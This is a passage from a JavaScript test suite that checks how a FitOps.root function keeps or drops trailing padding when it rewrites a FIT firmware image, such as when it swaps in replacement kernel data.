      kernelData: new TextEncoder().encode('PWNED\n'),   // same length as the fixture's
      method: 'sanity-check',
    });

    assert.equal(out.byteLength, padded.byteLength);
    assert.equal(sizeOf(out), out.byteLength);
    assert.ok(tailOf(out).byteLength > 0, 'some padding should survive');
    assert.ok(tailOf(out).every(b => b === 0xa5), 'padding must be the input\'s own');
  });

  it('does nothing when the operation outgrows the padding', async () => {
    const opts = {
      changeDtModel: false,
      replaceKernel: true,
      kernelData: new TextEncoder().encode('a much longer replacement payload'),
    };
    const grown = await FitOps.root(withPadding(fitBinary, 16), opts);
    const plain = await FitOps.root(fitBinary, opts);

    assert.ok(grown.byteLength > fitBinary.byteLength + 16, 'should have outgrown the padding');
    assert.equal(grown.byteLength, plain.byteLength, 'no padding once we are past it');
    assert.equal(tailOf(grown).byteLength, 0);
  });

  it('leaves a FIT without padding alone', async () => {
    const out = await FitOps.root(fitBinary, { changeDtModel: true, method: 'sanity-check' });
    assert.equal(tailOf(out).byteLength, 0);
    assert.equal(sizeOf(out), out.byteLength);
  });
});
